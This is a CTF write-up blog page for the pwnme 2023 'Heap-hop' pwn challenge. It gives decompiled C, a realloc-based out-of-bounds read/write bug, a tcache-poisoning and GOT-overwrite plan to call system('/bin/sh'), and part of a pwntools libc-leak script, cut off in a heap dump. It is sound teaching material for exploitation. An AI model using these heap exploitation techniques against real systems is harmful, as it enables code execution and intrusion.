<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
<link href="/fontawesome/css/brands.css" rel="stylesheet">
<link href="/fontawesome/css/solid.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  

  
  <title>[pwnme 2023 - pwn] Heap-hop | repr</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/MaterialSymbolsRounded.woff2" as="font" type="font/woff2" crossorigin="anonymous">

  <meta name="description" content="Heap-Hop Solves: 31  Medium Heap exploitation is cool, and the best is when no free is used. &gt;Try to pwn the challenge and get the flag remotely. Note:  You must spawn an instance to solve this cha">
<meta property="og:type" content="article">
<meta property="og:title" content="[pwnme 2023 - pwn] Heap-hop">
<meta property="og:url" content="https://n4sm.github.io/posts/heaphop/index.html">
<meta property="og:site_name" content="repr">
<meta property="og:description" content="Heap-Hop Solves: 31  Medium Heap exploitation is cool, and the best is when no free is used. &gt;Try to pwn the challenge and get the flag remotely. Note:  You must spawn an instance to solve this cha">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2023-05-06T22:00:00.000Z">
<meta property="article:modified_time" content="2023-09-05T09:45:11.052Z">
<meta property="article:author" content="nasm">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="nasm">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="pwnme">
<meta property="article:tag" content="heap">
<meta property="article:tag" content="tcache">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="repr" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/pic/wall.png" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="shadow   ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>repr </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="material-symbols-rounded light-mode-icon">wb_sunny</span>
      <span class="material-symbols-rounded dark-mode-icon">dark_mode</span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <span class="material-symbols-rounded rss">rss_feed</span>
      </a>
    
    <a id="nav-search-btn" class="nav-icon" title="Search" style="display: none;">
      <span class="material-symbols-rounded">search</span>
    </a>
    <div id="nav-menu-btn" class="nav-icon">
      <span class="material-symbols-rounded">menu</span>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=https://cdn.discordapp.com/attachments/755522926819934349/1135933820852502589/chtholly_nota_seniorious_by_asukaln_dfhx63b-414w-2x.jpg></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">nasm </div>
      <div class="dot"></div>
      <div class="subtitle">pwn / kernel stuff </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com/nasm_re" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/n4sm" title="GitHub"><i class="fa-brands fa-github"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://ret2school.github.io/discord" title="Discord"><i class="fa-brands fa-discord"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/pwn/">
                pwn
                <div class="category-count">19</div>
            </a>
        
            <a class="category-link" href="/categories/kernel/">
                kernel
                <div class="category-count">3</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/posts/iwindow/" title="[ImaginaryCTF 2023 - pwn] window-of-opportunity" >
            <div class="recent-link-text">
              [ImaginaryCTF 2023 - pwn] window-of-opportunity
            </div>
          </a>
        
          <a class="recent-link" href="/posts/mailman/" title="[ImaginaryCTF 2023 - pwn] mailman" >
            <div class="recent-link-text">
              [ImaginaryCTF 2023 - pwn] mailman
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       

<article id="post-heaphop" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        [pwnme 2023 - pwn] Heap-hop
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2023-05-06T22:00:00.000Z" itemprop="datePublished">2023-05-07</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/pwn/">pwn</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            2.6k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nasm/" rel="tag">nasm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnme/" rel="tag">pwnme</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tcache/" rel="tag">tcache</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h2 id="Heap-Hop"><a href="#Heap-Hop" class="headerlink" title="Heap-Hop"></a>Heap-Hop</h2><blockquote>
<p>Solves: 31  Medium</p>
<p>Heap exploitation is cool, and the best is when no free is used. &gt;Try to pwn the challenge and get the flag remotely.</p>
<p><strong>Note</strong>:</p>
<ul>
<li><em>You must spawn an instance to solve this challenge. You can connect to it with netcat: nc IP PORT</em></li>
</ul>
<p>Author: Express#8049</p>
<p>Remote service at : nc 51.254.39.184 1336</p>
</blockquote>
<p>Heap-hop is a heap exploitation challenge I did during the <a target="_blank" rel="noopener" href="https://pwnme.fr/">pwnme CTF</a>. It involved classic tricks like tcache poisoning and GOT hiijacking. You can find the related files <a target="_blank" rel="noopener" href="https://github.com/ret2school/ctf/tree/master/2023/pwnme/pwn/heap">here</a>.</p>
<h3 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h3><ul>
<li>Setup heap layout</li>
<li>fill tcachebin for 0x400 sized chunks</li>
<li>free large 0x400 sized chunk to get libc addresses</li>
<li>oob read onto the chunk right before the large freed chunk &#x3D;&gt; libc leak</li>
<li>request a small 0x20 sized chunk that gets free right after, it falls at the begin of the chunk in the unsortedbin, oob read like just before &#x3D;&gt; heap leak.</li>
<li>tcache poisoning (we’re able to deal with safe-linking given we leaked heap)</li>
<li>With the help of tcache poisoning, overwrite <code>realloc@got</code> to write <code>&amp;system</code></li>
<li><code>realloc(&quot;/bin/sh&quot;)</code> is then <code>system(&quot;/binb/sh&quot;)</code></li>
</ul>
<h2 id="What-we-have"><a href="#What-we-have" class="headerlink" title="What we have"></a>What we have</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ checksec --file ./heap-hop</span><br><span class="line">[*] &#x27;/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ret2school/ctf/2023/pwnme/pwn/heap/heap-hop&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3ff000)</span><br><span class="line">    RUNPATH:  b&#x27;/home/nasm/Documents/pwn/pwnme/heap&#x27;</span><br><span class="line">$ ./libc.so.6 </span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.</span><br><span class="line">Copyright (C) 2022 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 11.2.0.</span><br><span class="line">libc ABIs: UNIQUE IFUNC ABSOLUTE</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure>

<p>What we can see is that a recent libc is provided (which means with safe-linking) and that the binary isn’t PIE.</p>
<h2 id="Code-review"><a href="#Code-review" class="headerlink" title="Code review"></a>Code review</h2><p>Here is basically the main logic of the binary:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> input_int; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] Welcome to hip-hop, you can create and listen to heap-hop music&quot;</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;Make your choice :\n\t- 1. Create a track.\n\t- 2. Read a track.\n\t- 3. Edit a track.\n&gt; &quot;</span>);</span><br><span class="line">    input_int = read_input_int();</span><br><span class="line">    <span class="keyword">if</span> ( input_int == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      handle_edit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( input_int &gt; <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      <span class="keyword">if</span> ( input_int == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        handle_create();</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( input_int == <span class="number">2</span> )</span><br><span class="line">        handle_read();</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">LABEL_10:</span><br><span class="line">        quit = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( quit != <span class="number">1</span> );</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;[?] Goodbye.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Basic layout for a heap exploitation challenge, we’re allowed to create, read and edit a given track. As we already read in the initial statement we apparently cannot free a track.</p>
<p>Let’s first take a look at the create function:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">handle_create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v0; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">chunk_t</span> *buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  idx = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the tracklist ID\n&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0x100</span> )</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( tracks[idx] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] track already exists.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    buf = (<span class="type">chunk_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !buf )</span><br><span class="line">      _exit(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter the tracklist name\n&gt; &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter the tracklist content length\n&gt; &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;buf-&gt;size);</span><br><span class="line">    <span class="keyword">if</span> ( buf-&gt;size &gt; <span class="number">0x480</span>uLL )</span><br><span class="line">      _exit(<span class="number">1</span>);</span><br><span class="line">    v0 = <span class="built_in">malloc</span>(buf-&gt;size);</span><br><span class="line">    buf-&gt;track = (__int64)v0;</span><br><span class="line">    <span class="keyword">if</span> ( !buf-&gt;track )</span><br><span class="line">      _exit(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter the tracklist content\n&gt; &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !read(<span class="number">0</span>, (<span class="type">void</span> *)buf-&gt;track, buf-&gt;size) )</span><br><span class="line">      _exit(<span class="number">1</span>);</span><br><span class="line">    tracks[idx] = buf;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] track successfully created.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>It crafts a chunk, and then allocates a chunk for a given size (&lt; 0x480). The read function is very basic:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">handle_read</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the tracklist ID\n&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0x100</span> )</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( tracks[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] track content :&quot;</span>);</span><br><span class="line">    write(<span class="number">1</span>, (<span class="type">const</span> <span class="type">void</span> *)tracks[v1]-&gt;track, tracks[v1]-&gt;size);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_4020FF);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] track doesn&#x27;t exist.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>It prints <code>tracks[v1]-&gt;size</code> bytes from <code>tracks[v1]-&gt;track</code>. Which means no need to worry about badchars for the leak.</p>
<p>The bug lies in the <code>handle_edit</code> function:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">handle_edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">chunk_t</span> *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  idx = <span class="number">0</span>;</span><br><span class="line">  size = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the tracklist ID\n&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0x100</span> )</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( tracks[idx] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter the new tracklist content length\n&gt; &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;size);</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x480</span> )</span><br><span class="line">      _exit(<span class="number">1</span>);</span><br><span class="line">    v0 = tracks[idx];</span><br><span class="line">    v0-&gt;track = (__int64)<span class="built_in">realloc</span>((<span class="type">void</span> *)v0-&gt;track, size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter the new tracklist content\n&gt; &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, (<span class="type">void</span> *)tracks[idx]-&gt;track, tracks[idx]-&gt;size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] track content edited.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] track doesn&#x27;t exist.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>There are two bugs, or at least interesting behaviours around realloc. First there is an out of bound (oob) read &#x2F; write, indeed if we give a size smaller than <code>tracks[idx]-&gt;size</code>, then <code>v0-&gt;track</code> could be changed to a smaller chunk and thus <code>read(0, (void *)tracks[idx]-&gt;track, tracks[idx]-&gt;size);</code> could write over the end of the chunk. Secondly we can free a chunk by giving zero to the size.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Given tcache poisoning seems to be pretty easy to achieve, we need to find where we could use our arbitrary write. If you remind well, the binary isn’t PIE based and has only partial RELRO, which means we could easily hiijack the GOT entry of a function (like realloc) to replace it with system and then call <code>realloc(&quot;/bin/sh&quot;)</code>. This way we need to get a heap and a libc leak.</p>
<h3 id="libc-leak"><a href="#libc-leak" class="headerlink" title="libc leak"></a>libc leak</h3><p>To get a libc leak we can fill the tcache and free a large chunk to make appear libc addresses on the heap and then read it through the oob read. Which gives:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0</span>, <span class="string">b&quot;&quot;</span>, <span class="number">5</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step one, 7 chunks to fill tcache later</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    create(<span class="number">1</span>+i, <span class="string">b&quot;&quot;</span>, <span class="number">0x400</span>, <span class="built_in">str</span>(i).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># small chunk which will be used to the oob r/w</span></span><br><span class="line">create(<span class="number">8</span>+<span class="number">1</span>, <span class="string">b&quot;&quot;</span>, <span class="number">0x20</span>, <span class="string">b&quot;_&quot;</span>)</span><br><span class="line"><span class="comment"># victim chunk</span></span><br><span class="line">create(<span class="number">9</span>+<span class="number">1</span>, <span class="string">b&quot;&quot;</span>, <span class="number">0x400</span>, <span class="string">b&quot;_&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk with big size that will be used for the oob r/w</span></span><br><span class="line">create(<span class="number">10</span>+<span class="number">1</span>, <span class="string">b&quot;&quot;</span>, <span class="number">0x200</span>, <span class="string">b&quot;barreer&quot;</span>)</span><br><span class="line">create(<span class="number">10</span>+<span class="number">2</span>, <span class="string">b&quot;&quot;</span>, <span class="number">0x20</span>, <span class="string">b&quot;barree2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fill tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(<span class="number">1</span>+i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># oob chunk </span></span><br><span class="line">free(<span class="number">8</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">11</span>) <span class="comment"># we free in order that at the next edit it actually allocates a new chunk</span></span><br><span class="line">edit(<span class="number">11</span>, <span class="number">0x20</span>, <span class="string">b&quot;_&quot;</span>) <span class="comment"># allocated in 9</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">9</span>+<span class="number">1</span>) <span class="comment"># falls in the unsortedbin</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">11</span>) <span class="comment"># oob read</span></span><br><span class="line">io.recv(<span class="number">0x70</span>)</span><br><span class="line">libc.address = pwn.unpack(io.recv(<span class="number">8</span>)) - <span class="number">0x219ce0</span></span><br></pre></td></tr></table></figure>

<p>The heap looks like this:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 